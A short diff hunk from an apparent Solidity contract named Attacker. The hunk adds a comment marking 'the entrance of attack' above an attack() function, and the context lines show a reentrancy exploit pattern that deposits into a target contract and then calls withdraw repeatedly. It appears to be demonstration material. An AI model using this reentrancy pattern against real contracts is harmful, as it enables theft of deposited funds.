@@ -16,7 +16,7 @@ contract Attacker {
             targetContract.withdraw();
         }
     }
-
+    //the entrance of attack
     function attack() public payable {
         targetContract.deposite{value: msg.value}();
         targetContract.withdraw();
